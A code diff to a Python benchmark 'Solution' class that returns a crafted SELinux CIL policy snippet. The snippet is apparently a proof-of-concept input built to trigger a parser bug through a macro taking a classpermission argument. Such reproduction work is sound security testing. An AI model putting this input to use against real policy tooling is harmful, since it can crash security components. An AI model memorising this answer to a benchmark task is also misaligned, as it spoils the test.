@@ -1,9 +1,14 @@
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        poc = b'''(class myclass)
-(macro mac ((classpermissions cp))
-  (classpermissionset set cp)
+        poc = """(class file)
+(permission read write)
+(type user_t)
+(type user_file_t)
+(role user_r)
+(macro mymacro ((cp classpermission))
+  (classpermissionset myset $cp)
+  (allow user_t user_file_t myset)
 )
-(mac (classpermissions (myclass (read))))
-'''
-        return poc
+(mymacro (file (read write)))
+"""
+        return poc.encode('ascii')
